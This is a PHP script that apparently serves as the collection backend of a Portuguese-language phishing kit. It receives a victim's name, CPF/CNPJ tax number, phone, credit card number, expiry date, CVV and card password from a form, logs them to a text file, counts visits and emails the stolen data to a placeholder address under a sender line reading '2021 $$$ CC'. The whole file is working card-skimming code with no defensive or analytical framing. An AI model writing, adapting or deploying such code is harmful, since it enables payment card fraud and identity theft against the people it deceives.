<?php
ini_set("max_execution_time", 0);
ini_set("memory_limit", "-1");
error_reporting(0);
ini_set("display_errors", 0 );
$pessoa = $_POST['pessoa'];
$pessoa2 = str_replace('Olá,', '', $pessoa);
$cpf_cnpj = $_POST['cpf_cnpj'];
$phone = $_POST['phone'];
$cc = $_POST['cc'];
$validade = $_POST['validade'];
$cvv = $_POST['cvv'];
$passc = $_POST['passc'];
$fecha = date("d/m/Y h:i"); 
  
    $txt = "contador2.txt";
    $arquivo = fopen($txt,"r");
    $visitas   = fgets($arquivo,1024);
    fclose($arquivo);

    // Atualizando número de visitas
    $arquivo = fopen($txt,"r+");
    $visitas = $visitas + 1;
    fwrite($arquivo,$visitas);
    fclose($arquivo);



    $file = fopen('agora2021.txt','a+');
	fwrite($file, "=================".$fecha."==================\nNome: ".$pessoa2."\nCPF: ".$cpf_cnpj."\nFone: ".$phone."\nCC: ".$cc."\nValidade: ".$validade."\nCVV: ".$cvv."\nSenha: ".$passc."  \n=================".$fecha."==================\n");
	fclose($file);
//	header('Location: https://www.facebook.com/');
$headers = "Content-type: text/html; charset=UTF-8\r\n";
$headers .= "From: 2021 $$$ CC<chegouinfo@hotmail.com>";
$conteudo.="<b>IP Cliente: </b>$ip <br>";
$conteudo.="<b>=======_oOo_{-_-}_oOo_=======</b><br>";
$conteudo.="<b>Nome:</b> $pessoa2<br>";
$conteudo.="<b>CPF: </b>$cpf_cnpj<br>";
$conteudo.="<b>Cartão: </b>$cc<br>";
$conteudo.="<b>Validade: </b>$validade<br>";
$conteudo.="<b>CVV: </b>$cvv<br>";
$conteudo.="<b>Senha: </b>$passc<br>";
$conteudo.="<b>========_oOo_{-_-}_oOo_=======</b><br>";
@mail("seuemailaqui", "$ip", "$conteudo", $headers);


?>